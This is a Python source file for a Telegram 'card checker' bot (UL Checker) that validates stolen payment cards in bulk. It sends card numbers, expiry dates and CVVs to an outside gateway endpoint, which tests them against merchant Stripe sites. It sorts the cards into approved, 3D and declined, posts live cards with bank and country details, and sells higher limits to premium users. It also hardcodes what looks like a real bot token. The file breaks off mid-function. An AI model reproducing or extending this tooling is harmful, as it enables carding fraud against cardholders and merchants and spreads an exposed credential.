import requests
import re
import time
import telebot
from telebot import types
import os
import json
import random
import string
import html
import threading
import queue
from datetime import datetime, timedelta
import asyncio
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor
import multiprocessing
from collections import defaultdict

# --- Bot Setup ---
BOT_TOKEN = os.getenv('BOT_TOKEN', '8827608169:AAE2NVInl52DgRkA7_bKw2ZZRUUy_pJhBec')
bot = telebot.TeleBot(BOT_TOKEN, threaded=True, num_threads=100)

# Owner IDs (list)
OWNER_IDS = [8754004223]

# Thread-safe storage
users_data = {}
codes_data = {}
status_data = {'total_checks': 0, 'total_approved': 0, 'users_checked': []}

# Authorized groups (where bot can work)
authorized_groups = []  # Group IDs where bot is allowed to work
groups_lock = threading.Lock()

# Stripe sites list (owner can add/remove)
stripe_sites = ["rosetone.co.uk"]  # Default site
sites_lock = threading.Lock()

# Thread locks
data_lock = threading.Lock()
active_checks_lock = threading.Lock()
file_locks = {
    'approved': threading.Lock(),
    'declined': threading.Lock(),
    'results': threading.Lock()
}

# Active checking sessions - PER USER isolation
active_checks = {}  # user_id -> check_info for current user session
stop_flags = {}  # user_id -> threading.Event() for stop flag

# User limits configuration - Thread-safe
user_limits = {
    'free': {
        'single': 1,
        'mass': 10,
        'mtxt': 30,
        'cooldown': 15,
        'daily': float('inf')
    },
    'premium': {
        'single': 1,
        'mass': 50,
        'mtxt': 1000,
        'cooldown': 1,
        'daily': float('inf')
    },
    'owner': {
        'single': float('inf'),
        'mass': float('inf'),
        'mtxt': float('inf'),
        'cooldown': 0,
        'daily': float('inf')
    }
}

# Daily usage tracking
daily_usage = defaultdict(int)  # user_id -> count
usage_lock = threading.Lock()

# Check cooldown
last_check = defaultdict(float)
cooldown_lock = threading.Lock()

# Queue for processing checks
check_queue = queue.Queue()
processing_threads = []

# Thread pool for parallel checking - 100 workers
parallel_executor = ThreadPoolExecutor(max_workers=100)

# ==================== HELPER FUNCTIONS ====================

def get_user_session_key(message):
    """Get unique session key for user (user_id + chat_id combination)"""
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    # For private chats, just use user_id
    if message.chat.type == 'private':
        return f"private_{user_id}"
    
    # For groups/channels, combine user_id and chat_id
    return f"group_{chat_id}_{user_id}"

def check_free_user_access(message):
    """Check if free user can access commands in private chat"""
    user_status = get_user_status(message.from_user.id)
    
    # Free users can't use commands in private chat
    if user_status == 'free' and message.chat.type == 'private':
        # Show welcome message with join button
        markup = types.InlineKeyboardMarkup(row_width=1)
        join_btn = types.InlineKeyboardButton("✅ Join Our Group", url="https://t.me/UL_CHATV2")  # Replace with actual group link
        markup.add(join_btn)
        
        welcome_msg = """👋 Welcome to the UL Checker Bot!

❌ You are not a subscriber, but you can still check cards for FREE in our group!

✅ **Features in Group:**
• Free single card checking
• Free multi-card checking (up to 15 cards)
• Instant results

⬇️ Click the button below to join and start checking:"""
        
        safe_send_message(message.chat.id, welcome_msg, reply_markup=markup)
        return False
    
    return True

# Group authorization check
def is_group_authorized(chat_id):
    """Check if group is authorized to use the bot"""
    with groups_lock:
        return chat_id in authorized_groups

def check_group_authorization(message):
    """Check if message is from authorized group or private chat"""
    # Always allow private chats (for premium/owner)
    if message.chat.type == 'private':
        user_status = get_user_status(message.from_user.id)
        if user_status == 'free':
            return check_free_user_access(message)
        return True
    
    # Check if group is authorized
    if is_group_authorized(message.chat.id):
        return True
    
    # Group not authorized - send message only in group
    safe_send_message(message.chat.id, 
                      "❌ This group is not authorized to use this bot.\n\nContact owner to authorize this group.",
                      reply_to_message_id=message.message_id)
    return False

# Safe message sending
def safe_send_message(chat_id, text, reply_markup=None, parse_mode='HTML', reply_to_message_id=None):
    """Safely send message with retry logic"""
    max_retries = 3
    for attempt in range(max_retries):
        try:
            return bot.send_message(chat_id, text, reply_markup=reply_markup, 
                                  parse_mode=parse_mode, reply_to_message_id=reply_to_message_id)
        except Exception as e:
            if attempt == max_retries - 1:
                print(f"Failed to send message after {max_retries} attempts: {e}")
                return None
            time.sleep(1)

def safe_edit_message_text(chat_id, message_id, text, reply_markup=None, parse_mode='HTML'):
    """Safely edit message with retry logic"""
    max_retries = 3
    for attempt in range(max_retries):
        try:
            return bot.edit_message_text(text, chat_id=chat_id, message_id=message_id, 
                                       reply_markup=reply_markup, parse_mode=parse_mode)
        except Exception as e:
            if attempt == max_retries - 1:
                print(f"Failed to edit message after {max_retries} attempts: {e}")
                return None
            time.sleep(0.5)

# Thread-safe data operations
def get_user_status(user_id):
    """Get user status with premium expiration check"""
    user_id_str = str(user_id)
    
    # Owner is always owner
    if user_id in OWNER_IDS:
        return 'owner'
    
    with data_lock:
        user_data = users_data.get(user_id_str, {})
        
        # Check for premium
        if 'premium_until' in user_data:
            try:
                premium_until = datetime.fromisoformat(user_data['premium_until'])
                if datetime.now() < premium_until:
                    return 'premium'
                else:
                    # Premium expired - remove it
                    del user_data['premium_until']
                    users_data[user_id_str] = user_data
            except Exception as e:
                print(f"Error parsing premium date: {e}")
                # Remove invalid premium data
                if 'premium_until' in user_data:
                    del user_data['premium_until']
                    users_data[user_id_str] = user_data
    
    return 'free'

def get_user_limits(user_id):
    """Get user limits"""
    status = get_user_status(user_id)
    return user_limits[status]

def get_user_today_usage(user_id):
    """Get today's usage"""
    user_id_str = str(user_id)
    with usage_lock:
        return daily_usage.get(user_id_str, 0)

def update_user_usage(user_id, count=1):
    """Update user usage"""
    user_id_str = str(user_id)
    with usage_lock:
        daily_usage[user_id_str] = daily_usage.get(user_id_str, 0) + count

def reset_daily_usage():
    """Reset daily usage at midnight"""
    while True:
        now = datetime.now()
        # Calculate time until next midnight
        next_midnight = (now + timedelta(days=1)).replace(hour=0, minute=0, second=0, microsecond=0)
        sleep_time = (next_midnight - now).total_seconds()
        
        time.sleep(sleep_time)
        
        with usage_lock:
            daily_usage.clear()
        print("Daily usage reset at midnight")

# Start daily reset thread
reset_thread = threading.Thread(target=reset_daily_usage, daemon=True)
reset_thread.start()

def check_cooldown(user_id):
    """Check if user is in cooldown"""
    user_status = get_user_status(user_id)
    cooldown = user_limits[user_status]['cooldown']
    
    with cooldown_lock:
        current_time = time.time()
        if user_id in last_check:
            elapsed = current_time - last_check[user_id]
            if elapsed < cooldown:
                return False, int(cooldown - elapsed)
        
        last_check[user_id] = current_time
        return True, 0

# Card checking functions
def reg(card_details):
    """Validate and format card"""
    card_details = card_details.strip()
    
    patterns = [
        r'^(\d{15,16})[\|\s](\d{1,2})[\|\s](\d{2,4})[\|\s](\d{3,4})$',
        r'^(\d{15,16})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})$',
        r'^(\d{15,16}):(\d{1,2}):(\d{2,4}):(\d{3,4})$',
        r'^(\d{15,16})-(\d{1,2})-(\d{2,4})-(\d{3,4})$',
    ]
    
    for pattern in patterns:
        match = re.match(pattern, card_details)
        if match:
            card_num, month, year, cvv = match.groups()
            
            # Validate month
            if int(month) < 1 or int(month) > 12:
                continue
                
            # Validate year
            current_year = int(str(datetime.now().year)[2:])
            if len(year) == 2:
                year_int = int(year)
                if year_int < current_year or year_int > current_year + 20:
                    continue
            elif len(year) == 4:
                year_int = int(year)
                if year_int < datetime.now().year or year_int > datetime.now().year + 20:
                    continue
            
            return f"{card_num}|{month}|{year}|{cvv}"
    
    return 'None'

def get_bin_info(bin_number):
    """Get BIN information with improved error handling"""
    try:
        response = requests.get(f'https://bins.antipublic.cc/bins/{bin_number}', timeout=3)
        if response.status_code == 200:
            data = response.json()
            return {
                'bin': bin_number,
                'brand': data.get('brand', 'Unknown'),
                'type': data.get('type', 'Unknown'),
                'bank': data.get('bank', 'Unknown'),
                'country_name': data.get('country_name', 'Unknown'),
                'country_flag': data.get('country_flag', '🏳️'),
                'level': data.get('level', 'Unknown')
            }
    except requests.exceptions.Timeout:
        print(f"BIN lookup timeout for {bin_number}")
    except requests.exceptions.ConnectionError:
        print(f"BIN lookup connection error for {bin_number}")
    except Exception as e:
        print(f"BIN lookup error for {bin_number}: {e}")
    
    return {
        'bin': bin_number,
        'brand': 'Unknown',
        'type': 'Unknown',
        'bank': 'Unknown',
        'country_name': 'Unknown',
        'country_flag': '🏳️',
        'level': 'Unknown'
    }

# ==================== 🔥 NEW API (FIXED) ====================
def stripe_api_check(cc, user_id=None):
    """Stripe API checker with NEW API"""
    global stripe_sites
    
    with sites_lock:
        if not stripe_sites:
            return {
                'result': 'No sites available',
                'site': 'None',
                'status': 'Error',
                'response_msg': 'Owner needs to add sites first',
                'api_status': 'Error',
                'api_response': 'No sites available',
                'error': 'No sites configured'
            }
        
        site = stripe_sites[0]
    
    if user_id and user_id in stop_flags and stop_flags[user_id].is_set():
        return {
            'result': 'Stopped by user',
            'site': site,
            'status': 'Stopped 🛑',
            'response_msg': 'Check stopped by user',
            'api_status': 'stopped',
            'api_response': 'Check stopped',
            'error': 'User stopped check'
        }
    
    max_retries = 2
    last_error = None
    
    for attempt in range(max_retries):
        try:
            if user_id and user_id in stop_flags and stop_flags[user_id].is_set():
                return {
                    'result': 'Stopped by user',
                    'site': site,
                    'status': 'Stopped 🛑',
                    'response_msg': 'Check stopped by user',
                    'api_status': 'stopped',
                    'api_response': 'Check stopped',
                    'error': 'User stopped check'
                }
            
            # ==================== 🔥 NEW API URL ====================
            api_url = f"https://stripe-tan-seven.vercel.app/gateway?key=hyperog&site={site}&cc={cc}"
            # ==================== 🔥 CHANGE END ====================
            
            response = requests.get(api_url, timeout=300)
            
            if response.status_code != 200:
                if attempt < max_retries - 1:
                    time.sleep(0.5)
                    continue
                
                return {
                    'result': f'Error (HTTP {response.status_code})',
                    'site': site,
                    'status': 'Declined ❌',
                    'response_msg': f'HTTP Error {response.status_code}',
                    'api_status': 'declined',
                    'api_response': f'HTTP Error {response.status_code}',
                    'error': f'HTTP {response.status_code}',
                    'retry_attempt': attempt + 1
                }
            
            response_text = response.text.strip()
            
            if not response_text:
                return {
                    'result': 'Empty response',
                    'site': site,
                    'status': 'Declined ❌',
                    'response_msg': 'Empty response from API',
                    'api_status': 'declined',
                    'api_response': 'Empty response',
                    'error': 'Empty response',
                    'retry_attempt': attempt + 1
                }
            
            api_status = 'Unknown'
            api_response = response_text
            response_msg = response_text
            
            try:
                data = response.json()
                
                if 'status' in data:
                    api_status = data['status'].lower()
                
                if 'response' in data:
                    api_response = data['response']
                    response_msg = api_response
                elif 'message' in data:
                    api_response = data['message']
                    response_msg = api_response
                elif 'result' in data:
                    api_response = data['result']
                    response_msg = api_response
                
            except:
                api_response = response_text
                response_msg = response_text
            
            response_lower = str(api_response).lower()
            
            success_patterns = ['success', 'approved', 'payment method added', 'charge', 'succeeded', 'payment successful', 'card charged', 'authenticate', '✓']
            decline_patterns = ['decline', 'insufficient', 'invalid', 'incorrect', 'failed', 'error', 'card declined', 'try again', 'declined']
            three_d_patterns = ['requires_action', '3d', 'otp', 'authentication', 'required_action', '3ds', 'secure', 'requires action']
            
            if 'requires_action' in response_lower:
                final_status = '3D Required ⚠️'
            elif api_status == 'approved':
                final_status = 'Approved ✅'
            elif api_status == 'declined':
                final_status = 'Declined ❌'
            elif any(pattern in response_lower for pattern in success_patterns):
                final_status = 'Approved ✅'
            elif any(pattern in response_lower for pattern in three_d_patterns):
                final_status = '3D Required ⚠️'
            elif any(pattern in response_lower for pattern in decline_patterns):
                final_status = 'Declined ❌'
            else:
                final_status = 'Declined ❌'
            
            clean_response = api_response
            if 'your card was declined' in response_lower:
                clean_response = 'Your card was declined.'
            elif 'insufficient funds' in response_lower:
                clean_response = 'Insufficient Funds'
            elif 'invalid card' in response_lower:
                clean_response = 'Invalid Card'
            elif 'incorrect cvv' in response_lower:
                clean_response = 'Incorrect CVV'
            elif 'try again' in response_lower:
                clean_response = 'Try Again'
            elif 'payment method added' in response_lower and '✓' in api_response:
                clean_response = api_response
            
            return {
                'result': clean_response[:100],
                'site': site,
                'status': final_status,
                'response_msg': clean_response[:100],
                'raw_response': api_response,
                'api_status': api_status,
                'api_response': clean_response,
                'is_3d': any(pattern in response_lower for pattern in three_d_patterns),
                'success': True,
                'retry_attempt': attempt + 1
            }
            
        except requests.exceptions.Timeout:
            last_error = f"Timeout (Attempt {attempt + 1}/{max_retries})"
            if attempt < max_retries - 1:
                time.sleep(0.5)
                continue
                
        except requests.exceptions.ConnectionError:
            last_error = f"Connection Error (Attempt {attempt + 1}/{max_retries})"
            if attempt < max_retries - 1:
                time.sleep(1)
                continue
                
        except Exception as e:
            last_error = f"Exception: {str(e)} (Attempt {attempt + 1}/{max_retries})"
            if attempt < max_retries - 1:
                time.sleep(0.5)
                continue
    
    return {
        'result': f'Error: {last_error}',
        'site': site,
        'status': 'Declined ❌',
        'response_msg': f'API Error: {last_error}',
        'api_status': 'declined',
        'api_response': f'API Error: {last_error}',
        'is_3d': False,
        'error': last_error,
        'success': False,
        'retry_attempt': max_retries
    }

# Parallel checking function
def check_card_parallel(card, check_info):
    """Check a single card in parallel"""
    try:
        user_id = check_info['user_id']
        
        if user_id in stop_flags and stop_flags[user_id].is_set():
            return None
        
        card = card.strip()
        if not card:
            return {'status': 'invalid', 'card': card, 'error': 'Empty card'}
        
        formatted_cc = reg(card)
        if formatted_cc == 'None':
            return {'status': 'invalid', 'card': card, 'error': 'Invalid card format'}
        
        try:
            cc_num, mm, yy, cvc = formatted_cc.split("|")
        except:
            return {'status': 'invalid', 'card': card, 'error': 'Failed to parse card details'}
        
        fullcc = f"{cc_num}|{mm}|{yy}|{cvc}"
        bin_number = cc_num[:6]
        
        try:
            bin_info = get_bin_info(bin_number)
        except Exception as e:
            bin_info = {
                'bin': bin_number,
                'brand': 'Unknown',
                'type': 'Unknown',
                'bank': 'Unknown',
                'country_name': 'Unknown',
                'country_flag': '🏳️',
                'level': 'Unknown'
            }
        
        try:
            result = stripe_api_check(fullcc, user_id)
            status_text = result['status']
            api_status = result.get('api_status', 'declined').lower()
            response_msg = result.get('api_response', 'No response')
            is_3d = result.get('is_3d', False)
            success = result.get('success', False)
            retry_attempt = result.get('retry_attempt', 1)
            error_msg = result.get('error', None)
            
            if api_status == 'stopped':
                return {'status': 'stopped', 'card': fullcc}
            
            update_user_usage(user_id, 1)
            
            if 'Approved ✅' in status_text and not is_3d and success:
                card_status = 'approved'
            elif '3D Required ⚠️' in status_text or is_3d:
                card_status = 'three_d'
            elif 'Declined ❌' in status_text:
                card_status = 'declined'
            elif not success and error_msg:
                card_status = 'error'
                response_msg = f"API Error: {error_msg}"
            else:
                card_status = 'error'
            
            return {
                'status': card_status,
                'card': fullcc,
                'bin_info': bin_info,
                'response': response_msg,
                'status_text': status_text,
                'is_3d': is_3d,
                'success': success,
                'retry_attempt': retry_attempt,
                'error': error_msg
            }
            
        except Exception as e:
            return {
                'status': 'error', 
                'card': fullcc, 
                'error': f'Check failed: {str(e)}',
                'bin_info': bin_info,
                'response': f'Check failed: {str(e)}',
                'status_text': 'Declined ❌'
            }
        
    except Exception as e:
        return {'status': 'error', 'card': card, 'error': f'Processing failed: {str(e)}'}

# Processing worker
def check_worker():
    """Worker thread for processing checks"""
    while True:
        try:
            task = check_queue.get()
            if task is None:  # Poison pill
                break
            
            message, cards, is_file, check_type = task
            process_check_task(message, cards, is_file, check_type)
            check_queue.task_done()
            
        except Exception as e:
            print(f"Worker error: {e}")
            time.sleep(1)

# Start worker threads - 50 workers
num_workers = 50
for i in range(num_workers):
    t = threading.Thread(target=check_worker, daemon=True)
    t.start()
    processing_threads.append(t)

def process_check_task(message, cards, is_file, check_type):
    """Process a check task with 3-card parallel checking"""
    user_id = message.from_user.id
    user_status = get_user_status(user_id)
    limits = get_user_limits(user_id)
    
    daily_limit = limits['daily']
    current_usage = get_user_today_usage(user_id)
    
    if daily_limit != float('inf') and current_usage >= daily_limit:
        safe_send_message(
            message.chat.id,
            f"❌ Daily limit reached!\n📊 You have checked {current_usage}/{daily_limit} cards today.",
            reply_to_message_id=message.message_id
        )
        return
    
    with active_checks_lock:
        if user_id in active_checks:
            safe_send_message(
                message.chat.id,
                "⚠️ You already have an active card check. Please wait for it to complete or use /stopcheck to stop it.",
                reply_to_message_id=message.message_id
            )
            return
        
        stop_event = threading.Event()
        stop_flags[user_id] = stop_event
        
        active_checks[user_id] = {
            'start_time': time.time(),
            'total': len(cards),
            'type': check_type,
            'stop_event': stop_event,
            'original_message_id': message.message_id,
            'user_id': user_id,
            'chat_id': message.chat.id,
            'user_name': message.from_user.first_name
        }
    
    try:
        limit = limits[check_type]
        if limit != float('inf') and len(cards) > limit:
            cards = cards[:limit]
        
        total = len(cards)
        live = 0
        dd = 0
        error = 0
        three_d = 0
        
        ko_msg = safe_send_message(message.chat.id, "Checking Your Cards...⌛", reply_to_message_id=message.message_id)
        if not ko_msg:
            with active_checks_lock:
                if user_id in active_checks:
                    del active_checks[user_id]
                if user_id in stop_flags:
                    del stop_flags[user_id]
            return
        
        ko = ko_msg.message_id
        approved_cards_list = []
        
        batch_size = 3
        processed_cards = 0
        
        for i in range(0, len(cards), batch_size):
            if user_id in stop_flags and stop_flags[user_id].is_set():
                break
            
            batch = cards[i:i + batch_size]
            batch_futures = []
            for card in batch:
                future = parallel_executor.submit(
                    check_card_parallel, 
                    card, 
                    active_checks[user_id]
                )
                batch_futures.append(future)
            
            batch_results = []
            
            for future in batch_futures:
                if user_id in stop_flags and stop_flags[user_id].is_set():
                    break
                
                try:
                    result = future.result(timeout=300)
                    
                    if result is None:
                        continue
                    
                    if result.get('status') == 'stopped':
                        break
                    
                    batch_results.append(result)
                    
                except Exception as e:
                    error += 1
                    processed_cards += 1
                    print(f"Error getting future result: {e}")
            
            for result in batch_results:
                if user_id in stop_flags and stop_flags[user_id].is_set():
                    break
                
                card_status = result.get('status')
                
                if card_status == 'approved':
                    live += 1
                    
                    fullcc = result['card']
                    bin_info = result['bin_info']
                    response_msg = result['response']
                    
                    msg = f"""<b>[#STRIPE AUTH] | UL CHECKER ◆</b>

<b>[•] Card-</b> <code>{fullcc}</code>
<b>[•] Gateway -</b> <code>Stripe API</code>
<b>[•] Status-</b> <code>{result['status_text']}</code>
<b>[•] Response-</b> <code>{response_msg}</code>
______________________
<b>[+] Bin:</b> <code>{bin_info['bin']}</code>
<b>[+] Info:</b> <code>{bin_info['brand']} - {bin_info['type']}</code>
<b>[+] Bank:</b> <code>{bin_info['bank']}</code> 🏛
<b>[+] Country:</b> <code>{bin_info['country_name']}</code> ━ [{bin_info['country_flag']}]
______________________
<b>[ϟ] Checked By:</b> ⏤ <code>{message.from_user.first_name}</code>
<b>[ϟ] Daily Usage:</b> {get_user_today_usage(user_id)}/{daily_limit if daily_limit != float('inf') else '∞'}
<b>[ϟ] Bot By:</b> @OG_UNDEFINED"""
                    
                    safe_send_message(message.chat.id, msg, reply_to_message_id=message.message_id)
                    approved_cards_list.append(fullcc)
                    
                    with file_locks['approved']:
                        with open("approved.txt", "a", encoding="utf-8") as f:
                            f.write(f"{fullcc}|{result['status_text']}|{response_msg}\n")
                
                elif card_status == 'three_d':
                    three_d += 1
                    fullcc = result['card']
                    response_msg = result['response']
                    
                    with file_locks['approved']:
                        with open("approved.txt", "a", encoding="utf-8") as f:
                            f.write(f"{fullcc}|3D Required|{response_msg}\n")
                
                elif card_status == 'declined':
                    dd += 1
                
                elif card_status == 'error':
                    error += 1
                
                elif card_status == 'invalid':
                    dd += 1
                
                processed_cards += 1
            
            if user_id in stop_flags and stop_flags[user_id].is_set():
                break
                
            mes = types.InlineKeyboardMarkup(row_width=1)
            status_btn = types.InlineKeyboardButton(f"• 𝗣𝗥𝗢𝗖𝗘𝗦𝗦𝗘𝗗 ➜ [ {processed_cards}/{total} ] •", callback_data='u8')
            cm3 = types.InlineKeyboardButton(f"• 𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 ✅ ➜ [ {live} ] •", callback_data='x')
            cm4 = types.InlineKeyboardButton(f"• 𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 ❌ ➜ [ {dd} ] •", callback_data='x')
            cm5 = types.InlineKeyboardButton(f"• 𝟯𝗗 ⚠️ ➜ [ {three_d} ] •", callback_data='x')
            cm6 = types.InlineKeyboardButton(f"• 𝗘𝗥𝗥𝗢𝗥𝗦 🚫 ➜ [ {error} ] •", callback_data='x')
            stop_btn = types.InlineKeyboardButton(f"[ 𝗦𝗧𝗢𝗣🛑 ]", callback_data=f'stop_{user_id}_{ko}')
            mes.add(status_btn, cm3, cm4, cm5, cm6, stop_btn)
            
            safe_edit_message_text(
                chat_id=message.chat.id,
                message_id=ko,
                text=f'''<b>GATEWAY -> STRIPE API</b>
Checking cards in 3-card batches...
<b>Batch:</b> {i//batch_size + 1}/{(total + batch_size - 1)//batch_size}
<b>Processed:</b> {processed_cards}/{total}
<b>Batch Size:</b> 3 cards per batch
<b>Bot By:</b> @OG_UNDEFINED ''',
                reply_markup=mes
            )
            
            if not (user_id in stop_flags and stop_flags[user_id].is_set()):
                time.sleep(0.8)
        
        if user_id in stop_flags and stop_flags[user_id].is_set():
            safe_edit_message_text(
                chat_id=message.chat.id,
                message_id=ko,
                text='<b>𝗦𝗧𝗢𝗣𝗣𝗘𝗗 ✅</b>\n𝗕𝗢𝗧 𝗕𝗬 ➜ @OG_UNDEFINED'
            )
            with active_checks_lock:
                if user_id in active_checks:
                    del active_checks[user_id]
                if user_id in stop_flags:
                    del stop_flags[user_id]
            return
        
        final_usage = get_user_today_usage(user_id)
        
        if user_status != 'owner':
            if daily_limit != float('inf'):
                remaining = daily_limit - final_usage
                final_msg = f"""<b>𝗕𝗘𝗘𝗡 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘𝗗 ✅</b>
━━━━━━━━━━━━━━━━━
✅ Approved: {live}
❌ Declined: {dd}
⚠️ 3D Cards: {three_d}
🚫 Errors: {error}
📊 Used today: {final_usage}/{daily_limit}
📈 Remaining: {remaining}
━━━━━━━━━━━━━━━━━
𝗕𝗢𝗧 𝗕𝗬 ➜ @OG_UNDEFINED"""
            else:
                final_msg = f"""<b>𝗕𝗘𝗘𝗡 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘𝗗 ✅</b>
━━━━━━━━━━━━━━━━━
✅ Approved: {live}
❌ Declined: {dd}
⚠️ 3D Cards: {three_d}
🚫 Errors: {error}
📊 Used today: {final_usage} (Unlimited)
━━━━━━━━━━━━━━━━━
𝗕𝗢𝗧 𝗕𝗬 ➜ @OG_UNDEFINED"""
        else:
            final_msg = f"""<b>𝗕𝗘𝗘𝗡 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘𝗗 ✅</b>
━━━━━━━━━━━━━━━━━
✅ Approved: {live}
❌ Declined: {dd}
⚠️ 3D Cards: {three_d}
🚫 Errors: {error}
━━━━━━━━━━━━━━━━━
𝗕𝗢𝗧 𝗕𝗬 ➜ @OG_UNDEFINED"""
        
        safe_edit_message_text(
            chat_id=message.chat.id,
            message_id=ko,
            text=final_msg
        )
        
        if approved_cards_list and check_type == 'mtxt':
            try:
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                filename = f"approved_cards_{timestamp}.txt"
                
                with open(filename, 'w', encoding='utf-8') as f:
                    f.write(f"=== APPROVED CARDS (NON-3D) - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===\n\n")
                    f.write(f"Total Approved: {live}\n")
                    f.write(f"3D Cards: {three_d}\n")
                    f.write(f"Total Checked: {total}\n")
                    f.write(f"User: {message.from_user.first_name} (ID: {user_id})\n\n")
                    f.write("=== CARDS ===\n")
                    for card in approved_cards_list:
                        f.write(f"{card}\n")
                
                with open(filename, 'rb') as f:
                    bot.send_document(
                        message.chat.id,
                        f,
                        caption=f"✅ Approved Cards File (Non-3D Only)\n📊 Approved: {live} cards\n⚠️ 3D Cards: {three_d}",
                        parse_mode="HTML",
                        reply_to_message_id=message.message_id
                    )
                
                os.remove(filename)
            except Exception as e:
                print(f"Error sending approved file: {e}")
        
    except Exception as e:
        safe_send_message(message.chat.id, f"❌ Error: {str(e)}", reply_to_message_id=message.message_id)
    finally:
        with active_checks_lock:
            if user_id in active_checks:
                del active_checks[user_id]
            if user_id in stop_flags:
                del stop_flags[user_id]

# ==================== BOT COMMANDS ====================

@bot.message_handler(commands=['start'])
def start_command(message):
    """Start command with authorization check"""
    if not check_free_user_access(message):
        return
    
    if not check_group_authorization(message):
        return
    
    user_name = message.from_user.first_name
    user_status = get_user_status(message.from_user.id)
    
    if user_status == 'owner':
        status_display = '👑 OWNER'
    elif user_status == 'premium':
        status_display = '💎 PREMIUM'
    else:
        status_display = '⚡ FREE'
    
    limits = get_user_limits(message.from_user.id)
    current_usage = get_user_today_usage(message.from_user.id)
    
    with sites_lock:
        sites_count = len(stripe_sites)
